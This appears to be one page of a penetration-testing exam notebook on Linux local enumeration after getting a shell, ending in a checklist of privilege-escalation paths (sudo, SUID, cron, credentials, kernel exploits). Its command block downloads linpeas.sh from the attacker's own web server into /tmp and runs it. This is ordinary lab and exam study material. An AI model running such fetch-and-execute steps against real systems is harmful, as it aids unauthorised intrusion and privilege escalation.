# Linux - Local Enum

**Step 13 of 50 · Linux**

*Identify the user, host, kernel, and the local privilege paths available from the shell.*

## Run this

```bash
whoami
id
hostname
uname -a
wget http://$LocalIP:$WebPort/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

## Example output

 > *Example shape only: the LinPEAS transfer command is not yet verified against a real box.*
```
uid=1000(username) gid=1000(username) groups=1000(username)
Linux host 5.x x86_64
[+] Sudoers file: /etc/sudoers
...
```
## What did you get?

- [ ] Sudo rights are found → **Go to Step 14 · [[Linux - Sudo Check]]**
- [ ] SUID files are found → **Go to Step 15 · [[Linux - SUID Check]]**
- [ ] Root cron jobs or writable scripts are found → **Go to Step 16 · [[Linux - Cron Check]]**
- [ ] A writable service is found → **Follow the writable-service path**
- [ ] Credentials appear in files → **Go to Step 17 · [[Linux - Credential Search]]**
- [ ] A kernel exploit candidate is shown → **Go to Step 19 · [[Linux - Kernel Exploit]]**
- [ ] Nothing useful is found → **Go to Step 17 · [[Linux - Credential Search]]**

## Notes

Serve `linpeas.sh` from the local web directory and keep the listener separate.

## Gotcha

> [!warning] 💡
> The exact LinPEAS transfer command varies by shell and target tools. Confirm the available downloader before using it.

> [!warning]
> Command not yet verified against a real box. Confirm the exact `wget` transfer and LinPEAS execution syntax before relying on it in an exam.
